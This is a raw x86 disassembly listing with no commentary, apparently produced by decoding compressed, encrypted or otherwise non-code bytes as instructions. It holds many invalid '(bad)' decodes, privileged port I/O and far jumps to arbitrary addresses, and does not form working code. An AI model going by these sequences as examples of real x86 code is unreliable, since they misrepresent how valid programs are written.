  41f3bf:	pop    edx
  41f3c0:	xor    eax,0xe579727f
  41f3c5:	sub    esp,DWORD PTR [eax]
  41f3c7:	outs   dx,BYTE PTR ds:[esi]
  41f3c8:	pop    ebx
  41f3c9:	xor    eax,0xe2284de3
  41f3ce:	bound  ecx,QWORD PTR [eax+0x28]
  41f3d1:	cli    
  41f3d2:	call   0xeacf6861
  41f3d7:	mov    ebx,0x5d6bad9b
  41f3dc:	pop    eax
  41f3dd:	sub    al,BYTE PTR [ebp-0x41]
  41f3e0:	add    eax,0x729a2b9c
  41f3e5:	mov    dl,0x1e
  41f3e7:	jmp    FWORD PTR [ebp+0x1eff1098]
  41f3ed:	rcl    BYTE PTR es:[edi+0x4f],0xe8
  41f3f2:	dec    ebx
  41f3f3:	or     eax,0xe927f57
  41f3f8:	bnd jnp 0x41f3b2
  41f3fb:	lahf   
  41f3fc:	push   0x7493922e
  41f401:	fisttp QWORD PTR [eax+0x63]
  41f404:	mov    edx,DWORD PTR [ebx+0x3b]
  41f407:	(bad)  
  41f408:	mov    bh,0xce
  41f40a:	test   edx,ebp
  41f40c:	fwait
  41f40d:	add    bl,BYTE PTR [ecx+0x68d1b691]
  41f413:	ficom  WORD PTR [eax]
  41f415:	adc    eax,0xa6d60a0
  41f41a:	cmc    
  41f41b:	fadd   DWORD PTR ds:0x10c40a6f
  41f421:	or     eax,0xf13bef8f
  41f426:	push   0xed31a38e
  41f42b:	mov    ch,0xc
  41f42d:	xor    edx,DWORD PTR [ebx]
  41f42f:	les    ebx,FWORD PTR ds:[edx]
  41f432:	pmulhw mm4,QWORD PTR [edx]
  41f435:	cmc    
  41f436:	jmp    0x1f856134
  41f43b:	push   esi
  41f43c:	jl     0x41f477
  41f43e:	add    eax,0x83faa4de
  41f443:	cmp    eax,DWORD PTR [edx]
  41f445:	xor    esp,edx
  41f447:	add    edi,DWORD PTR [eax]
  41f449:	cs dec ebx
  41f44b:	inc    esp
  41f44c:	inc    esp
  41f44d:	adc    al,BYTE PTR [ecx]
  41f44f:	arpl   WORD PTR [ecx-0x65fed9d9],ax
  41f455:	retf   0x6130
  41f458:	bound  edx,QWORD PTR ds:0x9751790e
  41f45e:	lods   al,BYTE PTR ds:[esi]
  41f45f:	mov    DWORD PTR [esi-0x23],ebx
  41f462:	adc    al,0x2c
  41f464:	lea    ebx,[ebx+0x20]
  41f467:	jb     0x41f45a
  41f469:	daa    
  41f46a:	ins    DWORD PTR es:[edi],dx
  41f46b:	jns    0x41f4a9
  41f46d:	mov    bl,0xf3
  41f46f:	xor    eax,0xeb11e685
  41f474:	cmp    dl,BYTE PTR [ecx+esi*1-0x38e4b639]
  41f47b:	arpl   WORD PTR [ebp-0x5b389dd8],bx
  41f481:	add    DWORD PTR [ebp+0x9],ebp
  41f484:	add    bl,ch
  41f486:	das    
  41f487:	stos   DWORD PTR es:[edi],eax
  41f488:	in     al,0xc2
  41f48a:	rol    BYTE PTR [ebp+0xa44e25b],0xbc
  41f491:	or     al,0xa8
  41f493:	popa   
  41f494:	out    dx,eax
  41f495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f496:	pop    ebx
	...
  41f513:	add    BYTE PTR [edx+0xc],ch
  41f516:	lea    ebx,[eax-0x1806611]
  41f51c:	into   
  41f51d:	out    dx,al
  41f51e:	popf   
  41f51f:	adc    eax,DWORD PTR ds:0xe18cfdd2
  41f525:	mov    es,WORD PTR [ecx]
  41f527:	add    BYTE PTR [ebx+0x7],ch
  41f52a:	add    BYTE PTR [eax],al
  41f52c:	sub    ch,BYTE PTR [eax+0x3fb0e7b2]
  41f532:	jns    0x41f4d2
  41f534:	and    al,0x3e
  41f536:	mov    eax,0x5333953e
  41f53b:	inc    sp
  41f53d:	ficomp WORD PTR [esi]
  41f53f:	aas    
  41f540:	mov    bh,0xef
  41f542:	dec    edi
  41f543:	pushf  
  41f544:	dec    ebp
  41f545:	mov    al,0xe6
  41f547:	jbe    0x41f5c7
  41f549:	cwde   
  41f54a:	out    dx,al
  41f54b:	pop    ds
  41f54c:	in     al,0x1c
  41f54e:	inc    ebx
  41f54f:	f2xm1  
  41f551:	arpl   WORD PTR [ecx+esi*1-0x7e],dx
  41f555:	(bad)  
  41f556:	cli    
  41f557:	xchg   edx,eax
  41f558:	cmp    esp,DWORD PTR [ecx-0x1a710d0e]
  41f55e:	jge    0x41f572
  41f560:	test   DWORD PTR [edx+0x7131cb0c],edi
  41f566:	out    dx,al
  41f567:	iret   
  41f568:	out    dx,eax
  41f569:	cmp    ebp,ebx
  41f56b:	scas   eax,DWORD PTR es:[edi]
  41f56c:	mov    BYTE PTR [eax-0x44712d8a],ah
  41f572:	sbb    DWORD PTR [ebx+ebx*1],edi
  41f575:	pop    es
  41f576:	or     dh,al
  41f578:	gs pop edx
  41f57a:	add    eax,0xb8d4a9a5
  41f57f:	pop    esp
  41f580:	fsubr  QWORD PTR [esi+0x24]
  41f583:	cdq    
  41f584:	xchg   edi,eax
  41f585:	nop
  41f586:	inc    esi
  41f587:	add    BYTE PTR [ebx+0x35],ch
  41f58a:	mov    ch,0xc6
  41f58c:	add    dh,ah
  41f58e:	inc    esp
  41f58f:	outs   dx,DWORD PTR ds:[esi]
  41f590:	cmp    al,0xd5
  41f592:	adc    eax,0x6aaed66f
  41f597:	add    DWORD PTR [eax],ebp
  41f599:	in     eax,dx
  41f59a:	bound  esp,QWORD PTR [edx+0x4285193e]
  41f5a0:	cwde   
  41f5a1:	jne    0x41f5f5
  41f5a3:	add    DWORD PTR [edi+0x70],0x288b18fe
  41f5aa:	in     eax,0xe5
  41f5ac:	repnz test al,0x4f
  41f5af:	fwait
  41f5b0:	mov    ebx,0x9413e36a
  41f5b5:	xor    al,0x56
  41f5b7:	out    0x36,al
  41f5b9:	sbb    al,0xe2
  41f5bb:	icebp  
  41f5bc:	ds in  eax,0x5a
  41f5bf:	loope  0x41f546
  41f5c1:	mov    edi,0x5b5d7bc
  41f5c6:	mov    al,0x78
  41f5c8:	push   cs
  41f5c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5ca:	and    bl,dl
  41f5cc:	pop    ss
  41f5cd:	shl    DWORD PTR [eax-0x8862a6b],1
  41f5d3:	aaa    
  41f5d4:	cli    
  41f5d5:	adc    al,0xcc
  41f5d7:	adc    eax,0xa9478a7c
  41f5dc:	enter  0xbaa,0xb6
  41f5e0:	fisubr WORD PTR [ebx+0x64]
  41f5e3:	mov    ebx,0xb9d7d580
  41f5e8:	test   eax,0x93fc50d5
  41f5ed:	mov    dh,0x8d
  41f5ef:	sbb    eax,0x42548169
  41f5f4:	xlat   BYTE PTR ds:[ebx]
  41f5f5:	test   BYTE PTR [ecx-0x143d216],bl
  41f5fb:	fwait
  41f5fc:	loope  0x41f5a7
  41f5fe:	or     esi,DWORD PTR [edx-0x5aeba895]
  41f604:	sbb    BYTE PTR [esi-0x15],0xb1
  41f608:	aad    0xc7
  41f60a:	sub    edi,DWORD PTR [ebx]
  41f60c:	cmp    al,0x37
  41f60e:	hlt    
  41f60f:	sub    DWORD PTR [ebp+0x7be45fd7],esi
  41f615:	int3   
  41f616:	std    
  41f617:	pop    esi
  41f619:	or     DWORD PTR [ecx-0xc],ebx
  41f61c:	sub    al,0x54
  41f61e:	fcmovu st,st(4)
  41f620:	dec    esi
  41f621:	dec    ecx
  41f622:	iret   
  41f623:	mov    al,0x4
  41f625:	dec    esp
  41f626:	mov    edi,esi
  41f628:	dec    eax
  41f629:	(bad)  
  41f62a:	sti    
  41f62b:	das    
  41f62c:	sar    dl,1
  41f62e:	jl     0x41f646
  41f630:	add    eax,0x93956554
  41f635:	pop    eax
  41f636:	icebp  
  41f637:	cmp    eax,DWORD PTR [esp+edi*2-0x1d]
  41f63b:	inc    edx
  41f63c:	mov    esp,0xe3a1570e
  41f641:	stos   BYTE PTR es:[edi],al
  41f642:	sub    eax,0xcf383345
  41f647:	pop    ds
  41f648:	sub    dh,BYTE PTR [edi-0x55e3e61e]
  41f64e:	call   0xd6df8949
  41f653:	arpl   WORD PTR [ecx+0x684e0a0f],dx
  41f659:	adc    eax,0xb48a6ade
  41f65e:	jmp    0x7c3d:0xa19088ef
  41f665:	rcl    BYTE PTR [edi-0x427fcf11],cl
  41f66b:	mov    ecx,0x1f800185
  41f670:	mov    cl,0x26
  41f672:	repz mov eax,0x3d50ca46
  41f678:	dec    edi
  41f679:	mov    ah,0x61
  41f67b:	fiadd  WORD PTR [eax]
  41f67d:	jns    0x41f65c
  41f67f:	out    dx,eax
  41f680:	repz pop es
  41f682:	or     eax,0x4d41f4a
  41f687:	aas    
  41f688:	loope  0x41f666
  41f68a:	iret   
  41f68b:	xchg   ebx,eax
  41f68c:	(bad)  
  41f68e:	add    eax,0xe1e9f2c3
  41f693:	fcom   QWORD PTR [edi+0x52f67b4f]
  41f699:	out    dx,al
  41f69a:	fcmovnb st,st(6)
  41f69c:	int3   
  41f69d:	in     al,0xca
  41f69f:	enter  0x3199,0x30
  41f6a3:	or     bl,BYTE PTR ds:0xd38b0580
  41f6a9:	xchg   ebp,eax
  41f6aa:	pusha  
  41f6ab:	pop    DWORD PTR [ecx]
  41f6ad:	jno    0x41f664
  41f6af:	jbe    0x41f724
  41f6b1:	and    bh,BYTE PTR [edx]
  41f6b3:	adc    cl,bh
  41f6b5:	mov    ecx,0xbd9caf70
  41f6ba:	sbb    ebp,eax
  41f6bc:	in     eax,0xd
  41f6be:	xlat   BYTE PTR ds:[ebx]
  41f6bf:	leave  
  41f6c0:	popf   
  41f6c1:	nop
  41f6c2:	out    0xc,eax
  41f6c4:	add    ecx,DWORD PTR [esi-0xa145be4]
  41f6ca:	pop    edi
  41f6cb:	fsubr  QWORD PTR [eax+0x3827f580]
  41f6d1:	inc    ecx
  41f6d2:	mov    ?,WORD PTR [ecx+0x932f93a]
  41f6d8:	xor    BYTE PTR [ecx-0x4],ch
  41f6db:	in     eax,0x5e
  41f6dd:	jmp    0x792c3207
  41f6e2:	add    DWORD PTR [esi],ecx
  41f6e4:	inc    esp
  41f6e5:	mov    BYTE PTR [edi],bl
  41f6e7:	out    0x94,al
  41f6e9:	sub    esp,ebx
  41f6eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6ec:	cmc    
  41f6ed:	mov    dh,0x4d
  41f6ef:	jns    0x41f6e9
  41f6f1:	icebp  
  41f6f2:	aas    
  41f6f3:	mov    bh,0x77
  41f6f5:	cmp    eax,DWORD PTR [ebx+0x8c31b19]
  41f6fb:	add    DWORD PTR [ebx+ebx*2+0x26],0x8b07929b
  41f703:	ins    DWORD PTR es:[edi],dx
  41f704:	cmp    BYTE PTR [ecx+0x4b],bh
  41f707:	leave  
  41f708:	(bad)
  41f70b:	sahf   
  41f70c:	mov    cl,0x1d
  41f70e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f70f:	fwait
  41f710:	(bad)  
  41f711:	mov    ch,0xb8
  41f713:	pop    eax
  41f714:	inc    esi
  41f715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f716:	xchg   esp,eax
  41f717:	add    ch,dl
  41f719:	adc    DWORD PTR [edx+0x16],eax
  41f71c:	xlat   BYTE PTR ds:[ebx]
  41f71d:	repz or DWORD PTR [ebx+esi*2],esp
  41f721:	test   al,0x95
  41f723:	adc    DWORD PTR [edi+0x25],edx
  41f726:	gs jp  0x41f793
  41f729:	push   esp
  41f72a:	mov    ds,WORD PTR [edi+0x64]
  41f72d:	xor    esp,esi
  41f72f:	and    edi,DWORD PTR [edx-0x29]
  41f732:	mov    al,ds:0xa58f6e0b
  41f737:	inc    edx
  41f738:	mov    es,esp
  41f73a:	inc    ebx
  41f73b:	call   0xebc052d6
  41f740:	pop    ss
  41f741:	mov    BYTE PTR [ebp+edx*8+0x71f41988],dl
  41f748:	sbb    ebx,DWORD PTR [ebp+0x4e]
  41f74b:	xchg   DWORD PTR [edx],eax
  41f74d:	loope  0x41f778
  41f74f:	dec    esp
  41f750:	data16 (bad) 
  41f752:	scas   al,BYTE PTR es:[edi]
  41f753:	mov    dl,0x8a
  41f755:	mov    ds:0xfba31880,eax
  41f75a:	xchg   edi,eax
  41f75b:	std    
  41f75c:	push   cs
  41f75d:	ss loop 0x41f751
  41f760:	adc    eax,0xee4337a6
  41f765:	ds mov dh,0xc4
  41f768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f769:	or     dh,BYTE PTR [esi+0x43262dd3]
  41f76f:	lods   eax,DWORD PTR ds:[esi]
  41f770:	ja     0x41f74b
  41f772:	inc    esi
  41f773:	popa   
  41f774:	sub    bh,dl
  41f776:	xor    dh,BYTE PTR [ecx+0x5e946984]
  41f77c:	pop    esi
  41f77d:	lods   al,BYTE PTR ds:[esi]
  41f77e:	mov    bl,0x86
  41f780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f781:	pusha  
  41f782:	push   edx
  41f783:	sti    
  41f784:	jp     0x41f747
  41f786:	or     DWORD PTR [edx],edx
  41f788:	jnp    0x41f777
  41f78a:	(bad)
  41f78d:	add    edi,DWORD PTR ds:0xaa2bf275
  41f793:	mov    ds:0xd716b08f,al
  41f798:	mov    ecx,0xe0aad77e
  41f79d:	push   0xffffffdd
  41f79f:	(bad)  
  41f7a0:	xlat   BYTE PTR ds:[ebx]
  41f7a1:	(bad)  
  41f7a2:	js     0x41f814
  41f7a4:	add    al,0x0
  41f7a6:	fadd   QWORD PTR ds:0xd3a5ba13
  41f7ac:	mov    DWORD PTR [ebx+0x44],edx
  41f7af:	jnp    0x41f76e
  41f7b1:	loop   0x41f740
  41f7b3:	lds    eax,FWORD PTR [esi]
  41f7b5:	arpl   WORD PTR [esi-0x4fa7b2e4],si
  41f7bb:	inc    edx
  41f7bc:	stos   BYTE PTR es:[edi],al
  41f7bd:	push   esp
  41f7be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7bf:	test   eax,0x811ecca2
  41f7c4:	es inc ebp
  41f7c6:	sbb    al,0xb0
  41f7c8:	xor    BYTE PTR [edi],cl
  41f7ca:	stc    
  41f7cb:	or     dl,BYTE PTR [ecx+0x2e]
  41f7ce:	ror    ecx,0xa8
  41f7d1:	mov    eax,ds:0x8c571b8b
  41f7d6:	mov    BYTE PTR [esi],cl
  41f7d8:	inc    ebp
  41f7d9:	dec    edi
  41f7da:	push   ebp
  41f7db:	test   DWORD PTR [ebp-0x6660f8f3],0xdbd7dc26
  41f7e5:	sbb    BYTE PTR [edx+0x6121db0b],dl
  41f7eb:	into   
  41f7ec:	cli    
  41f7ed:	xchg   esi,eax
  41f7ee:	dec    ebp
  41f7ef:	leave  
  41f7f0:	call   0xb36af8ab
  41f7f5:	mov    ds:0xe42af033,eax
  41f7fa:	push   cs
  41f7fb:	pop    ss
  41f7fc:	push   cs
  41f7fd:	push   cs
  41f7fe:	mov    al,ds:0x86e6ecb5
  41f803:	push   0x7b
  41f805:	mov    eax,ds:0xc32595f2
  41f80a:	sub    eax,0x89ab5c80
  41f80f:	xchg   esi,eax
  41f810:	adc    DWORD PTR [ecx+0x22],ecx
  41f813:	jb     0x41f801
  41f815:	dec    edx
  41f816:	lahf   
  41f817:	dec    edx
  41f818:	mov    eax,ds:0x3c223545
  41f81d:	pop    edx
  41f81e:	push   ss
  41f81f:	jbe    0x41f820
  41f821:	sahf   
  41f822:	icebp  
  41f823:	rcl    BYTE PTR [edx+0x51f80dc5],1
  41f829:	mov    al,ds:0x8a2d773
  41f82e:	mov    ch,0xfa
  41f830:	outs   dx,DWORD PTR ds:[esi]
  41f831:	bnd jl 0x41f7ed
  41f834:	inc    ebp
  41f835:	lock out dx,al
  41f837:	mov    esp,0x9d2ca886
  41f83c:	push   ss
  41f83d:	(bad)  
  41f83e:	in     al,0xe0
  41f840:	push   ecx
  41f841:	lock push si
  41f844:	int3   
  41f845:	fs dec edx
  41f847:	dec    ebx
  41f848:	outs   dx,BYTE PTR ds:[esi]
  41f849:	shl    DWORD PTR [ecx+0x3f],0x76
  41f84d:	inc    esp
  41f84e:	sub    DWORD PTR [esi],ebx
  41f850:	loop   0x41f840
  41f852:	mov    bp,0x460a
  41f856:	ss enter 0xd3fb,0xc1
  41f85b:	push   ebp
  41f85c:	xor    BYTE PTR [edi+0x7c843047],bl
  41f862:	or     DWORD PTR [edi],0x56
  41f865:	lds    ecx,FWORD PTR [eax-0x7c68458f]
  41f86b:	adc    BYTE PTR [ebx+ebx*1-0x5aa7ff33],ah
  41f872:	push   0x6e
  41f874:	repnz push ecx
  41f876:	aas    
  41f877:	(bad)  
  41f878:	sub    ah,dl
  41f87a:	lods   eax,DWORD PTR ds:[esi]
  41f87b:	mov    eax,0xba5b458a
  41f880:	inc    eax
  41f881:	aam    0xe1
  41f883:	or     al,0x22
  41f885:	jb     0x41f88a
  41f887:	inc    edx
  41f888:	jno    0x41f875
  41f88a:	repnz sub ecx,esi
  41f88d:	or     al,0xae
  41f88f:	les    edi,FWORD PTR [esi]
  41f891:	mov    dh,0xa5
  41f893:	jecxz  0x41f8d9
  41f895:	mov    DWORD PTR [edx+edx*2+0x562df327],0x2ba5204
  41f8a0:	mov    ebp,0x3a6d658f
  41f8a5:	mov    al,ds:0x7425b669
  41f8aa:	sbb    ecx,edi
  41f8ac:	inc    esp
  41f8ad:	fdiv   st,st(5)
  41f8af:	fsubrp st(3),st
  41f8b1:	daa    
  41f8b2:	imul   ebp,esp,0xfffffffb
  41f8b5:	std    
  41f8b6:	popa   
  41f8b7:	xor    al,BYTE PTR [ecx]
  41f8b9:	sbb    dh,cl
  41f8bb:	mov    DWORD PTR [ecx+0x26],edi
  41f8be:	add    al,0x18
  41f8c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8c1:	shl    esp,0x8e
  41f8c4:	push   ebx
  41f8c5:	cmp    ch,BYTE PTR [eax+0x5b83bc8d]
  41f8cb:	scas   al,BYTE PTR es:[edi]
  41f8cc:	mov    cl,0x35
  41f8ce:	out    dx,al
  41f8cf:	mov    ds:0x42f4650a,al
  41f8d4:	or     BYTE PTR [ebx],ah
  41f8d6:	scas   al,BYTE PTR es:[edi]
  41f8d7:	leave  
  41f8d8:	inc    ecx
  41f8d9:	imul   ebp,edi,0x39
  41f8dc:	mov    ch,0x44
  41f8de:	call   0x5d41c290
  41f8e3:	lods   eax,DWORD PTR ds:[esi]
  41f8e4:	jbe    0x41f87a
  41f8e6:	mov    BYTE PTR [ebp-0x39],dh
  41f8e9:	jg     0x41f941
  41f8eb:	sub    DWORD PTR [edi-0xf217440],esi
  41f8f1:	adc    BYTE PTR [eax],bl
  41f8f3:	loop   0x41f903
  41f8f5:	int    0x76
  41f8f7:	pop    edx
  41f8f8:	je     0x41f87b
  41f8fa:	xor    DWORD PTR [ebp+0x7c5de7d8],ebx
  41f900:	out    0x17,eax
  41f902:	add    esi,DWORD PTR [edi-0x6c44509b]
  41f908:	mov    WORD PTR [esi-0x3346ddf8],cs
  41f90e:	test   DWORD PTR gs:[esi-0x62],ebp
  41f912:	cmp    edi,DWORD PTR [ecx+esi*2-0x1fb500bf]
  41f919:	jo     0x41f8ee
  41f91b:	leave  
  41f91c:	push   cs
  41f91d:	test   eax,0x654f4fe3
  41f922:	sbb    edx,ebx
  41f924:	cmp    al,0x96
  41f926:	xor    edx,DWORD PTR [edi+0x2deac38f]
  41f92c:	mov    edi,0xf9894ee0
  41f931:	daa    
  41f932:	vpcomd xmm2,xmm5,XMMWORD PTR [ecx-0x9a7876b],0xd9
  41f93c:	xor    esi,DWORD PTR [esi-0x74b51ed9]
  41f942:	sub    DWORD PTR [eax],esp
  41f944:	push   0x6e8a5fd0
  41f949:	pop    ecx
  41f94a:	jo     0x41f9b9
  41f94c:	dec    ebx
  41f94d:	repz adc ebp,ebx
  41f950:	les    ebx,FWORD PTR [esi+eax*1+0x23dccf4]
  41f957:	stc    
  41f958:	(bad)  
  41f959:	arpl   WORD PTR [edi],ax
  41f95b:	(bad)  
  41f95c:	fisttp WORD PTR [ecx-0x20296a0b]
  41f962:	repnz sub al,0x2
  41f965:	sub    dh,BYTE PTR [ecx-0x37]
  41f968:	repnz xor bl,BYTE PTR [eax]
  41f96b:	mov    ebp,0xb6869bd4
  41f970:	xor    eax,0xdd954a2b
  41f975:	gs sub eax,0x4710843c
  41f97b:	cmp    BYTE PTR [ebp+0x3eefc851],ch
  41f981:	fstp   TBYTE PTR [eax+ebx*1]
  41f984:	add    DWORD PTR [edi+0x3e17a88d],ebx
  41f98a:	xchg   ebx,eax
  41f98b:	xchg   edi,eax
  41f98c:	aaa    
  41f98d:	dec    edx
  41f98e:	push   DWORD PTR [eax+edx*4]
  41f991:	popaw  
  41f993:	imul   eax,DWORD PTR [edx+0x4dd48720],0x4f
  41f99a:	or     dh,BYTE PTR [esi]
  41f99c:	mov    eax,0x47ff7a83
  41f9a1:	imul   ecx,DWORD PTR [ebx],0x55
  41f9a4:	xor    BYTE PTR [esi+0x1be8de65],bl
  41f9aa:	stc    
  41f9ab:	retf   
  41f9ac:	sahf   
  41f9ad:	and    BYTE PTR [eax],bl
  41f9af:	mov    dl,0x4f
  41f9b1:	shl    bh,1
  41f9b3:	jae    0x41f96e
  41f9b5:	pusha  
  41f9b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9b7:	addr16 rcr eax,0x1f
  41f9bb:	sbb    eax,0xe62c754a
  41f9c0:	arpl   WORD PTR [edx+0x73],cx
  41f9c3:	leave  
  41f9c4:	iret   
  41f9c5:	bound  edi,QWORD PTR [ebx-0x60]
  41f9c8:	inc    ecx
  41f9c9:	mov    ecx,0x6b34b080
  41f9ce:	push   0x1c
  41f9d0:	sar    BYTE PTR [eax],1
  41f9d2:	addr16 fld st(7)
  41f9d5:	test   BYTE PTR [eax+0x4ca03830],dh
  41f9db:	sbb    al,0x58
  41f9dd:	icebp  
  41f9de:	mov    DWORD PTR [edi-0x15],edx
  41f9e1:	mov    eax,0x6ee41c3f
  41f9e6:	fiadd  WORD PTR [esi+0x5dad3d9b]
  41f9ec:	in     eax,dx
  41f9ed:	dec    eax
  41f9ee:	xchg   edi,eax
  41f9ef:	fdivr  DWORD PTR [eax+0x27]
  41f9f2:	jnp    0x41fa07
  41f9f4:	hlt    
  41f9f5:	adc    eax,DWORD PTR [eax]
  41f9f7:	repnz pop es
  41f9f9:	arpl   WORD PTR [ebp+0x143ba2b2],dx
  41f9ff:	loope  0x41fa47
  41fa01:	sub    ch,dh
  41fa03:	inc    eax
  41fa04:	lea    eax,[eax-0x2248680d]
  41fa0a:	push   esi
  41fa0b:	call   0x235e:0x7037c225
  41fa12:	push   ss
  41fa13:	retf   0xdaf6
  41fa16:	(bad)  
  41fa18:	push   ecx
  41fa19:	jmp    0x41f9e5
  41fa1b:	sub    BYTE PTR [ebp+eax*2-0x1bd040a2],dl
  41fa22:	lds    ecx,FWORD PTR ds:0xe4d6faa9
  41fa28:	fwait
  41fa29:	xchg   esp,eax
  41fa2a:	sub    DWORD PTR [esi+0x4d265f30],eax
  41fa30:	jl     0x41fa3c
  41fa32:	pop    edi
  41fa33:	sbb    bh,ah
  41fa35:	cs pop esi
  41fa37:	neg    ch
  41fa39:	(bad)  
  41fa3c:	ret    
  41fa3d:	mov    edi,0x1f4f9b4a
  41fa42:	into   
  41fa43:	sbb    eax,0x51b38aeb
  41fa48:	leave  
  41fa49:	pop    ds
  41fa4a:	cmp    eax,0x9064d5a7
  41fa4f:	xchg   BYTE PTR [ecx],bl
  41fa51:	and    BYTE PTR [ecx],0xa4
  41fa54:	fwait
  41fa55:	xor    eax,0x66eac534
  41fa5a:	dec    eax
  41fa5b:	call   0x1468c4b7
  41fa60:	mov    edx,0xf0eaefa3
  41fa65:	sub    al,0x3d
  41fa67:	loope  0x41fa21
  41fa69:	lock imul ecx,esi,0xe2d5918c
  41fa70:	mov    ch,0xa8
  41fa72:	pushf  
  41fa73:	add    edi,0xffffff9b
  41fa76:	retf   0xfff7
  41fa79:	mov    WORD PTR [edx-0x52],?
  41fa7c:	jbe    0x41faa3
  41fa7e:	adc    bl,BYTE PTR [esi+0xd496116]
  41fa84:	add    ebx,ebx
  41fa86:	xchg   edx,eax
  41fa87:	push   ecx
  41fa88:	scas   eax,DWORD PTR es:[edi]
  41fa89:	jnp    0x41fab2
  41fa8b:	(bad)  [esi-0x72]
  41fa8e:	mov    BYTE PTR [edx+esi*1+0x26],bl
  41fa92:	cmp    DWORD PTR [edx+esi*2+0x6729ab52],edx
  41fa99:	mov    edx,0x6fc11fcf
  41fa9e:	push   ecx
  41fa9f:	push   ebp
  41faa0:	jle    0x41fb0b
  41faa2:	cmp    dl,ah
  41faa4:	jmp    0xe630:0xdb29a27b
  41faab:	aas    
  41faac:	mov    dl,0xc1
  41faae:	lahf   
  41faaf:	(bad)  
  41fab0:	out    0x50,al
  41fab2:	cmp    al,0xc
  41fab4:	inc    edx
  41fab5:	imul   edi,edi,0x12
  41fab8:	call   DWORD PTR [edx+0x7b7ab4b4]
  41fabe:	retf   0x3389
  41fac1:	cmp    eax,0x8956a320
  41fac6:	call   0xbd91:0x5e0bb372
  41facd:	jns    0x41faf9
  41facf:	pop    ecx
  41fad0:	imul   eax,DWORD PTR [esp+edx*8],0x400364df
  41fad7:	xchg   edx,eax
  41fad8:	push   0xffffffd7
  41fada:	adc    al,BYTE PTR [ebp+0x25]
  41fadd:	sub    eax,0xe461f4f7
  41fae2:	aad    0x6
  41fae4:	sub    ah,ah
  41fae6:	jns    0x41fab2
  41fae8:	xchg   esp,eax
  41fae9:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41faeb:	mov    esp,0x4e69e0b
  41faf0:	aas    
  41faf1:	shl    DWORD PTR [eax],cl
  41faf3:	mov    cl,0x50
  41faf5:	into   
  41faf6:	(bad)  
  41faf7:	nop
  41faf8:	in     eax,0xb4
  41fafa:	aad    0xd0
  41fafc:	and    bh,BYTE PTR [ebx]
  41fafe:	call   0x44dc:0x2b9d5876
  41fb05:	out    0x4a,al
  41fb07:	jmp    0x41fb11
  41fb09:	mov    ch,0x3f
  41fb0b:	mov    al,0x2c
  41fb0d:	ins    BYTE PTR es:[edi],dx
  41fb0e:	mov    dh,0x13
  41fb10:	rcr    cl,0xd3
  41fb13:	ret    0xea39
  41fb16:	and    eax,0xfbfb548c
  41fb1b:	inc    BYTE PTR [ebx+ebp*8+0x56e12565]
  41fb22:	pop    es
  41fb23:	or     ebp,DWORD PTR [ecx-0x1eb9a21d]
  41fb29:	aaa    
  41fb2a:	push   0x4f
  41fb2c:	push   cs
  41fb2d:	inc    ecx
  41fb2e:	add    al,0xf8
  41fb30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb31:	in     al,dx
  41fb32:	pop    es
  41fb33:	push   edi
  41fb34:	mov    al,ds:0x78e6029a
  41fb39:	mov    eax,0x3ef7acd
  41fb3e:	mov    bh,0xe4
  41fb40:	or     al,0x16
  41fb42:	xor    DWORD PTR [edx],eax
  41fb44:	ds stc 
  41fb46:	(bad)  
  41fb48:	test   al,0xaa
  41fb4a:	add    eax,0xd6843acd
  41fb4f:	fisub  WORD PTR [eax]
  41fb51:	retf   0xe870
  41fb54:	sub    al,0x1d
  41fb56:	mov    cl,0x29
  41fb58:	adc    ecx,ebx
  41fb5a:	retf   
  41fb5b:	jb     0x41fb53
  41fb5d:	or     eax,DWORD PTR [esi-0x62]
  41fb60:	xor    bl,BYTE PTR [edx+0x56]
  41fb63:	fnstcw WORD PTR [edx]
  41fb65:	and    al,0x72
  41fb67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb68:	mov    dl,0xb8
  41fb6a:	dec    ecx
  41fb6b:	into   
  41fb6c:	(bad)  
  41fb6d:	jmp    0x570abda9
  41fb72:	(bad)  
  41fb73:	mov    esp,0x393a1c50
  41fb78:	mov    bl,0x43
  41fb7a:	and    cl,BYTE PTR [ebx+edi*8-0x20f4abbc]
  41fb81:	aad    0x9c
  41fb83:	mov    eax,0xb853e70d
  41fb88:	or     eax,0x30b7c555
  41fb8d:	xchg   ebp,eax
  41fb8e:	adc    BYTE PTR [edx],0xf8
  41fb91:	les    esi,FWORD PTR [esi-0x1e5ddf0e]
  41fb97:	stos   DWORD PTR es:[edi],eax
  41fb98:	or     al,bh
  41fb9a:	mov    bl,dl
  41fb9c:	jns    0x41fb70
  41fb9e:	lea    esi,[ebp-0x612fa8ea]
  41fba4:	xor    ecx,edx
  41fba6:	hlt    
  41fba7:	cli    
  41fba8:	add    ch,BYTE PTR [ebp+edx*1-0x7]
  41fbac:	outs   dx,BYTE PTR ds:[esi]
  41fbad:	pop    ebp
  41fbae:	lea    edx,[edi]
  41fbb0:	or     al,0xda
  41fbb2:	loope  0x41fbe5
  41fbb4:	push   edx
  41fbb5:	jb     0x41fb71
  41fbb7:	mov    bl,0x75
  41fbb9:	jl     0x41fbd6
  41fbbb:	in     eax,0x80
  41fbbd:	cmp    al,0x9e
  41fbbf:	les    edi,FWORD PTR [eax]
  41fbc1:	push   ss
  41fbc2:	xchg   edi,eax
  41fbc3:	push   ds
  41fbc4:	adc    DWORD PTR [ebp-0x2b],esi
  41fbc7:	and    esi,esi
  41fbc9:	bound  ebp,QWORD PTR [ecx+0x1a72dd88]
  41fbcf:	push   0xffffff89
  41fbd1:	mov    eax,0x5c96967f
  41fbd6:	mov    edi,0xb4adaa92
  41fbdb:	push   esp
  41fbdc:	dec    ebx
  41fbdd:	adc    dh,BYTE PTR [eax]
  41fbdf:	jge    0x41fc2e
  41fbe1:	inc    edx
  41fbe2:	add    bl,BYTE PTR [esi-0x19]
  41fbe5:	stos   DWORD PTR es:[edi],eax
